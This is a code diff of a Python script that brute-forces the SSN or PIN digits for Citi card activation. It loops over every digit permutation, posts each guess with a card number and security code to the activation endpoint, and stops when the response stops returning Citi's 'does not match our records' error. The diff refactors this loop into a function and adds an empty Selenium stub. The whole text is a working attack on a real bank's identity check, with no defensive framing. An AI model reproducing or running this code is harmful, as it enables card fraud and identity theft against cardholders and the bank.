@@ -11,19 +11,26 @@ security_code = config.security_code
 
 possible_pins = permute(POSSIBLE_PIN_DIGITS, PIN_DIGIT_COUNT)
 
-for pin in possible_pins:
-    request_payload = {
-        'cardNumber': card_number,
-        'securityCode': security_code,
-        'ssn': pin
-    }
 
-    continue_response = requests.post(CONTINUE_URL, json=request_payload)
-    continue_response_payload = continue_response.json()
-    status_code = continue_response_payload['Status']
-    msg = continue_response_payload['Msg']
+def post_request_brute_force(possible_pins, card_number, security_code, url):
+    for pin in possible_pins:
+        request_payload = {
+            'cardNumber': card_number,
+            'securityCode': security_code,
+            'ssn': pin
+        }
 
-    if status_code != '999' or msg != 'The information you entered does not match our records. Please try again or contact Citi Customer Service at the number on the activation sticker or on the back of your card.':
+        continue_response = requests.post(CONTINUE_URL, json=request_payload)
+        continue_response_payload = continue_response.json()
+        status_code = continue_response_payload['Status']
+        msg = continue_response_payload['Msg']
+
         print(continue_response_payload)
         print(pin)
-        break
+
+        if status_code != '999' or msg != 'The information you entered does not match our records. Please try again or contact Citi Customer Service at the number on the activation sticker or on the back of your card.':
+            return
+
+
+def selenium_brute_force(possible_pins, card_number, security_code, url):
+    return
